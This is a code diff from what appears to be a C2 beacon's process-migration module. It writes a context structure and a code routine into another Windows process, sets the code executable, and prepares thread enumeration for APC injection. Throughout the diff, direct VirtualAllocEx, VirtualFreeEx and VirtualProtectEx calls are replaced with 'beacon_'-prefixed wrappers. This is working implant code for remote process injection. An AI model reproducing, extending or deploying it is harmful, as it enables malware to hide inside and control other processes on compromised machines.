@@ -62,33 +62,33 @@ static char * copycontext(HANDLE hProcess, DWORD pid, APCCONTEXT * context, char
 	 * allocations: the context must stay writable (the fired flag flips
 	 * remotely) while the code only needs to execute - a single combined
 	 * RWX page is what this used to be. */
-	ctx_remote = (char *)VirtualAllocEx(hProcess, NULL, sizeof(APCCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	code_remote = (char *)VirtualAllocEx(hProcess, NULL, fnsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	ctx_remote = (char *)beacon_VirtualAllocEx(hProcess, NULL, sizeof(APCCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	code_remote = (char *)beacon_VirtualAllocEx(hProcess, NULL, fnsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (ctx_remote == NULL || code_remote == NULL) {
 		if (ctx_remote != NULL)
-			VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
+			beacon_VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
 		if (code_remote != NULL)
-			VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
+			beacon_VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
 		*code_remote_out = NULL;
 		return NULL;
 	}
 
 	/* write our process memory */
 	if (!beacon_WriteProcessMemory(hProcess, ctx_remote, (char *)context, sizeof(APCCONTEXT), &wrote) || wrote != sizeof(APCCONTEXT)) {
-		VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
-		VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
 		*code_remote_out = NULL;
 		return NULL;
 	}
 	if (!beacon_WriteProcessMemory(hProcess, code_remote, (char *)_migrateit, fnsize, &wrote) || wrote != fnsize) {
-		VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
-		VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
 		*code_remote_out = NULL;
 		return NULL;
 	}
 
 	/* code is never modified remotely: drop it to RX before any APC runs */
-	VirtualProtectEx(hProcess, code_remote, fnsize, PAGE_EXECUTE_READ, &old);
+	beacon_VirtualProtectEx(hProcess, code_remote, fnsize, PAGE_EXECUTE_READ, &old);
 
 	*code_remote_out = code_remote;
 	return ctx_remote;
@@ -129,15 +129,15 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 	hThreadSnap        = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 	if (!hThreadSnap) {
 		/* no APCs queued yet - the remote allocations are safe to release */
-		VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
-		VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
 	if (!Thread32First(hThreadSnap, &t)) {
 		CloseHandle(hThreadSnap);
-		VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
-		VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
+		beacon_VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
